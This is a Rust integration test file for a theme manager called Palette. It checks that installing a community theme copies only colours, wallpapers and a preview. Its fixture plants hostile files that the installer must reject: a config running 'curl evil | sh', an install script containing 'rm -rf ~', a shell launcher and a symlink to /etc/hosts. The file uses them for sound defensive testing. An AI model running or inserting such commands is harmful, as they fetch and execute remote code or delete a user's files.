//! Phase 5c: installing community themes. Uses local folders shaped like
//! Omarchy theme repos, so no network is needed.

mod common;

use std::fs;
use std::path::Path;

use common::Home;

/// An Omarchy-style repo: colors.toml missing derived keys, wallpapers,
/// a preview, and files Palette must never take.
fn repo(home: &Home, dir: &str) -> String {
    home.write(
        &format!("{dir}/colors.toml"),
        "accent = \"#7aa2f7\"\nbackground = \"0x1a1b26\"\nforeground = \"#c0caf5\"\n\
         red = \"#f7768e\"\nyellow = \"#e0af68\"\ngreen = \"#9ece6a\"\ncyan = \"#7dcfff\"\n\
         blue = \"#7aa2f7\"\nmagenta = \"#bb9af7\"\n",
    );
    home.write(&format!("{dir}/backgrounds/1-city.jpg"), "jpg");
    home.write(&format!("{dir}/backgrounds/notes.txt"), "not an image");
    home.write(&format!("{dir}/preview.png"), "png");
    home.write(
        &format!("{dir}/ghostty.conf"),
        "command = /bin/sh -c 'curl evil | sh'\n",
    );
    home.write(&format!("{dir}/kitty.conf"), "launch sh\n");
    home.write(&format!("{dir}/install.sh"), "rm -rf ~\n");
    std::os::unix::fs::symlink(
        "/etc/hosts",
        home.path(&format!("{dir}/backgrounds/2-link.png")),
    )
    .unwrap();
    home.path(dir).to_string_lossy().to_string()
}

#[test]
fn install_takes_only_colours_wallpapers_and_preview() {
    let home = Home::new();
    let src = repo(&home, "omarchy-night-owl-theme");
    let out = home.ok(&["install", &src]);
    assert!(out.contains("Installed night-owl (1 wallpaper(s)"), "{out}");
    assert!(out.contains("filled in missing colours"), "{out}");

    let dir = home.palette_dir().join("themes/night-owl");
    let mut files: Vec<String> = walk(&dir);
    files.sort();
    assert_eq!(
        files,
        [
            ".palette-source",
            "backgrounds/1-city.jpg",
            "colors.toml",
            "preview.png"
        ],
        "only data, never configs, scripts or symlinks"
    );
    let colours = fs::read_to_string(dir.join("colors.toml")).unwrap();
    assert!(colours.contains("background = \"#1a1b26\""), "{colours}");
    assert!(colours.contains("# filled"), "{colours}");

    // It's a normal theme now.
    home.ok(&["set", "night-owl"]);
    assert_eq!(home.ok(&["current"]).trim(), "night-owl");
}

#[test]
fn names_are_never_clobbered() {
    let home = Home::new();
    let src = repo(&home, "omarchy-nord-theme");
    assert!(
        home.fails(&["install", &src])
            .contains("built-in theme called `nord`")
    );
    home.ok(&["install", &src, "--name", "nord-two"]);
    assert!(
        home.fails(&["install", &src, "--name", "nord-two"])
            .contains("already have")
    );
    assert!(
        home.fails(&["install", &src, "--name", "../x"])
            .contains("can't be a theme name")
    );
}

#[test]
fn update_keeps_wallpapers_you_added_and_remove_cleans_up() {
    let home = Home::new();
    let src = repo(&home, "omarchy-night-owl-theme");
    home.ok(&["install", &src]);
    let mine = home.write("mine.png", "png");
    home.ok(&["bg", "add", "--theme", "night-owl", mine.to_str().unwrap()]);
    // Upstream changes a colour and replaces its wallpaper.
    let colours = home
        .read("omarchy-night-owl-theme/colors.toml")
        .replace("#f7768e", "#ff0000");
    home.write("omarchy-night-owl-theme/colors.toml", &colours);
    fs::remove_file(home.path("omarchy-night-owl-theme/backgrounds/1-city.jpg")).unwrap();
    home.write("omarchy-night-owl-theme/backgrounds/2-sea.jpg", "jpg");

    let out = home.ok(&["update", "night-owl"]);
    assert!(out.contains("Installed night-owl"), "{out}");
    let dir = home.palette_dir().join("themes/night-owl");
    assert!(
        fs::read_to_string(dir.join("colors.toml"))
            .unwrap()
            .contains("#ff0000")
    );
    assert!(dir.join("backgrounds/2-sea.jpg").is_file());
    assert!(
        !dir.join("backgrounds/1-city.jpg").exists(),
        "upstream removed it"
    );
    assert!(dir.join("backgrounds/mine.png").is_file(), "yours stays");

    home.ok(&["set", "night-owl"]);
    assert!(
        home.fails(&["remove", "night-owl"])
            .contains("active theme")
    );
    home.ok(&["set", "nord"]);
    home.ok(&["remove", "night-owl"]);
    assert!(!dir.exists());
    // Built-in themes can't be removed (hand-made ones go to the Trash: tests/tools.rs).
    assert!(
        home.fails(&["remove", "nord"])
            .contains("built into Palette")
    );
}

#[test]
fn old_themes_without_colors_toml_use_alacritty() {
    let home = Home::new();
    home.write(
        "old/alacritty.toml",
        "[colors.primary]\nbackground = \"#002b36\"\nforeground = \"#839496\"\n\
         [colors.normal]\nblack = \"#073642\"\nred = \"#dc322f\"\ngreen = \"#859900\"\n\
         yellow = \"#b58900\"\nblue = \"#268bd2\"\nmagenta = \"#d33682\"\ncyan = \"#2aa198\"\n\
         white = \"#eee8d5\"\n[colors.bright]\nblack = \"#586e75\"\n",
    );
    let out = home.ok(&[
        "install",
        home.path("old").to_str().unwrap(),
        "--name",
        "solar",
    ]);
    assert!(out.contains("colours from alacritty.toml"), "{out}");
    home.ok(&["set", "solar"]);
    assert!(
        !home
            .fails(&["install", home.path("Random").to_str().unwrap()])
            .is_empty()
    );
}

#[test]
fn catalog_lists_offline() {
    let home = Home::new();
    let out = home.ok(&["catalog", "aura"]);
    assert!(out.contains("aura"), "{out}");
}

fn walk(dir: &Path) -> Vec<String> {
    let mut out = Vec::new();
    for e in fs::read_dir(dir).unwrap().flatten() {
        let p = e.path();
        let rel = p.strip_prefix(dir).unwrap().to_string_lossy().to_string();
        if e.file_type().unwrap().is_dir() {
            out.extend(walk(&p).into_iter().map(|f| format!("{rel}/{f}")));
        } else {
            out.push(rel);
        }
    }
    out
}
